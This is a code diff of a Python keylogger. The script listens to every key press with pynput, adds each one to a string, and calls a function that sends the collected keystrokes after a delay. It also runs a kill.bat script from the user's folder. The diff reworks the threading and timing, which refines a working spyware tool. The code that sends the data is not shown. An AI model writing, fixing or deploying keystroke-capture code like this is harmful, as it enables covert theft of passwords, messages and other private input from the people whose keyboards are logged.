@@ -1,6 +1,5 @@
 from pynput import keyboard
 import requests
-import threading
 import time
 import subprocess
 import os
@@ -54,8 +53,8 @@ def on_press(key):
     # Append the key press to the keystrokes string
     keystrokes += key_str
 
-    # Start a timer to send keystrokes after 30 seconds
-    threading.Thread(target=send_keystrokes_after_delay).start()
+    # Start a timer to send keystrokes after 10 seconds
+    send_keystrokes_after_delay()
 
 def on_release(key):
     if key == keyboard.Key.esc:
@@ -68,12 +67,12 @@ def execute_kill_script():
     bat_file_path = rf"C:\Users\{username}\kl2\kill.bat"
     subprocess.run([bat_file_path], shell=True)
 
-# Set up the listener in a separate thread so we can continue with other tasks
-listener_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=on_press, on_release=on_release).start())
-listener_thread.start()
+# Set up the listener
+listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+listener.start()
 
-# Execute the kill.bat file after starting the listener
+# Wait for the listener to finish (this blocks the main thread until ESC is pressed)
+listener.join()
+
+# Execute the kill.bat script after the listener finishes
 execute_kill_script()
-
-# Wait for the listener to finish
-listener_thread.join()
